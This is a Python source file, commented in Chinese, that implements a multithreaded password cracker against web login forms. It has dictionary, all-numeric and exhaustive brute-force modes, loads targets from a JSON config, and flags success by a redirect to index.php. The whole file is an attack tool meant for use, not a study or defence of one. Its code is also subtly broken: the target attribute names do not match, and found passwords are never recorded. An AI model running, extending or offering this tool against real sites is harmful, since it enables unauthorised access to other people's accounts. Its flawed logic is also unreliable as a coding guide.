import requests
import threading
import itertools
import os
import psutil
import time
import json
import logging
from concurrent.futures import ThreadPoolExecutor
#attempt_login
class PasswordCracker:
    def __init__(self, target=None, dict_path=None, config_file=None):
        """
        初始化密码破解器
        可以直接传入参数，或通过config_file导入配置
        """
        if config_file:
            self.load_config(config_file)
        else:
            self.target_url = target
            self.dictionary_file = dict_path
            self.username = 'admin'
            self.thread_count = min(10, os.cpu_count() or 1)
            self.modes = ["dict"]  # 默认使用字典模式
            
        self.found_passwords = []
        self.lock = threading.Lock()
        self.stop_event = threading.Event()
        self.stop_event = threading.Event()

    def load_config(self, config_file):
        """从JSON文件加载配置"""
        try:
            with open(config_file, 'r', encoding='utf-8') as f:
                config = json.load(f)
                
            # 设置基本配置
            self.target = config.get("url", "")
            self.username = config.get("username", "admin")
            self.dictionary_file = config.get("dictionary_file", "")
            self.thread_count = min(config.get("thread_count", 10), os.cpu_count() or 1)
            
            # 转换模式配置
            mode_map = {1: "dict", 2: "numeric", 3: "brute"}
            self.modes = [mode_map.get(m, "dict") for m in config.get("modes", [1])]
            
            # 验证配置
            self.validate_config()
            
            return True
        except Exception as e:
            logging.error(f"加载配置文件失败: {str(e)}")
            return False

    def validate_config(self):
        """验证配置是否有效"""
        if not self.target:
            raise ValueError("URL不能为空")
        if not self.username:
            raise ValueError("用户名不能为空")
        if "dict" in self.modes and not self.dictionary_file:
            logging.warning("使用字典模式但未指定字典文件")

    def save_config(self, config_file):
        """保存当前配置到JSON文件"""
        mode_map = {"dict": 1, "numeric": 2, "brute": 3}
        config = {
            "url": self.target,
            "username": self.username,
            "dictionary_file": self.dictionary_file,
            "modes": [mode_map.get(m, 1) for m in self.modes],
            "thread_count": self.thread_count
        }
        
        try:
            with open(config_file, 'w', encoding='utf-8') as f:
                json.dump(config, f, indent=4, ensure_ascii=False)
            return True
        except Exception as e:
            logging.error(f"保存配置文件失败: {str(e)}")
            return False

    def stop(self):
        """停止破解过程"""
        self.stop_event.set()
        
    def _check_stop(self):
        """检查是否需要停止"""
        return self.stop_event.is_set()

    # 修改各个攻击方法，添加停止检查
    def dictionary_attack(self):
        """字典攻击模式"""
        try:
            with open(self.dictionary_file, "r", encoding='utf-8') as f:
                passwords = f.readlines()
            
            with ThreadPoolExecutor(max_workers=self.thread_count) as executor:
                for result in executor.map(self.attempt_login, 
                                         (p.strip() for p in passwords)):
                    if self._check_stop():  # 检查是否需要停止
                        yield "破解过程被手动停止"
                        return
                        
                    if result:
                        yield f"找到正确密码: {self.found_passwords[0]}"
                        return
                    
            if not self.found_passwords:
                yield "未找到正确密码"
                
        except Exception as e:
            yield f"字典攻击出错: {str(e)}"

    def numeric_attack(self, max_length=8):
        """纯数字攻击模式"""
        try:
            for length in range(1, max_length + 1):
                for i in range(10 ** length):
                    if self._check_stop():  # 检查是否需要停止
                        yield "破解过程被手动停止"
                        return
                        
                    password = str(i).zfill(length)
                    if self.attempt_login(password):
                        yield f"找到正确密码: {password}"
                        return
                    yield f"尝试密码: {password}"
        except Exception as e:
            yield f"数字攻击出错: {str(e)}"
    def check_url(self,url):
        try:
            response = requests.get(url)
            if response.status_code == 200:
                return True
            else:
                return False
        except requests.exceptions.RequestException as e:
            return e
    def attempt_login(self, password):
        """
        尝试使用给定的密码登录到目标URL。

        :param password: 要尝试的密码
        :return: 如果登录成功返回True，否则返回False
        """
        import requests

        login_data = {
            'username': self.username,
            'password': password
        }

        try:
            if(self.check_url(self.target_url)):  
                response = requests.post(self.target_url, data=login_data,allow_redirects=True)
                # 根据实际情况判断登录是否成功
                if response.status_code == 200 and "index.php" in response.url:
                    return True
                else:
                    return False
            else:
                return False
        except requests.RequestException as e:
            print(f"请求异常: {e}")
    def brute_force_attack(self, max_length=8):
        """暴力破解模式"""
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()_+"
        try:
            for length in range(1, max_length + 1):
                for password in itertools.product(chars, repeat=length):
                    if self._check_stop():  # 检查是否需要停止
                        yield "破解过程被手动停止"
                        return
                        
                    password = ''.join(password)
                    if self.attempt_login(password):
                        yield f"找到正确密码: {password}"
                        return
                    yield f"尝试密码: {password}"
        except Exception as e:
            yield f"暴力破解出错: {str(e)}"

    def start(self, mode=None):
        """
        开始密码破解
        mode: 如果指定，则使用指定模式；否则使用配置文件中的模式
        """
        self.stop_event.clear()
        self.found_passwords = []
        
        try:
            if mode:
                # 使用指定的单一模式
                yield from self._run_single_mode(mode)
            else:
                # 使用配置文件中的所有模式
                for m in self.modes:
                    yield f"开始使用{m}模式进行破解..."
                    yield from self._run_single_mode(m)
                    if self.found_passwords:
                        break
        finally:
            self.stop_event.set()
    
    def _run_single_mode(self, mode):
        """运行单个破解模式"""
        if mode == "dict":
            yield from self.dictionary_attack()
        elif mode == "numeric":
            yield from self.numeric_attack()
        elif mode == "brute":
            yield from self.brute_force_attack()
        else:
            yield f"错误: 未知的破解模式 {mode}"

# 使用示例
def example_usage():
    # 从配置文件创建实例
    cracker = PasswordCracker(config_file="config.json")
    
    # 开始破解
    for result in cracker.start():
        print(result)
        if cracker.found_passwords:
            print(f"成功找到密码: {cracker.found_passwords[0]}")
            break

    # 保存更新后的配置
    cracker.save_config("new_config.json")
